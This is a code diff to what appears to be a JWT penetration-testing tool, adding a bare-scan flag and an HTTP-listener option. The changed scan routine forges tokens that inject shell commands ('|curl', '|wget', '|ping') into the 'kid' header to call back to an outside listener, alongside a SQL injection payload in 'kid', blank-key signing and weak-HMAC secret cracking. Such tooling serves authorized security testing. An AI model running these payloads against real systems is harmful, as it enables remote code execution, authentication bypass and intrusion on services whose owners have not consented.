@@ -1376,19 +1376,20 @@ def scanModePlaybook():
     config['argvals']['overridesub'] = "true"
     config['argvals']['cookies'] = tmpCookies
     config['argvals']['header'] = tmpHeader
-    # Broken sig
-    jwtTweak = contents.decode()+"."+sig[:-4]
-    jwtOut(jwtTweak, "Broken signature", "This token was sent to check if the signature is being checked")
-    # Persistent
-    jwtOut(jwt, "Persistence check 1 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
-    # Claim processing order - check reflected output in all claims
-    reflectedClaims()
-    jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
-    # Weak HMAC secret
-    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
-        cprintc("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
-        config['argvals']['keyList'] = "jwt-common.txt"
-        crackSig(sig, contents)
+    if not args.bare:
+        # Broken sig
+        jwtTweak = contents.decode()+"."+sig[:-4]
+        jwtOut(jwtTweak, "Broken signature", "This token was sent to check if the signature is being checked")
+        # Persistent
+        jwtOut(jwt, "Persistence check 1 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
+        # Claim processing order - check reflected output in all claims
+        reflectedClaims()
+        jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
+        # Weak HMAC secret
+        if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
+            cprintc("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
+            config['argvals']['keyList'] = "jwt-common.txt"
+            crackSig(sig, contents)
     # Exploit: blank password accepted in signature
     key = ""
     newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
@@ -1462,11 +1463,16 @@ def scanModePlaybook():
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)")
     if config['services']['httplistener']:
-        injectUrl = config['services']['httplistener']+"/RCE_in_kid"
-        newheadDict, newHeadB64 = injectheaderclaim("kid", "|curl"+injectUrl)
-        key = open("null.txt").read()
-        newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
-        jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
+        for cmd in ["curl", "wget", "ping -c4"]:
+            injectUrl = config['services']['httplistener']+"/RCE_in_kid"
+            if "ping" in cmd:
+                import urllib
+                injectUrl = urllib.parse.urlparse(injectUrl)
+                injectUrl = (injectUrl.netloc).split(":")[0]
+            newheadDict, newHeadB64 = injectheaderclaim("kid", "|"+cmd+" "+injectUrl)
+            key = open("null.txt").read()
+            newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+            jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
     # kid inject: SQLi explicit value
     newheadDict, newHeadB64 = injectheaderclaim("kid", "x' UNION SELECT '1';--")
     key = "1"
@@ -1658,6 +1664,8 @@ def reflectedClaims():
 
 
 def preScan():
+    if args.bare:
+        return
     cprintc("Running prescan checks...", "cyan")
     jwtOut(jwt, "Prescan: original token", "Prescan: original token")
     if config['argvals']['canaryvalue']:
@@ -1840,6 +1848,8 @@ if __name__ == '__main__':
                         help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
     parser.add_argument("-ju", "--jwksurl", action="store",
                         help="URL location where you can host a spoofed JWKS")
+    parser.add_argument("-hl", "--httplistener", action="store",
+                        help="Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.")
     parser.add_argument("-S", "--sign", action="store",
                         help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
     parser.add_argument("-pr", "--privkey", action="store",
@@ -2006,6 +2016,8 @@ if __name__ == '__main__':
         config['crypto']['jwks'] = args.jwksfile
     if args.jwksurl:
         config['services']['jwksloc'] = args.jwksurl
+    if args.httplistener:
+        config['services']['httplistener'] = args.httplistener
     if args.payloadclaim:
         config['argvals']['payloadclaim'] = str(args.payloadclaim)
     if args.headerclaim:
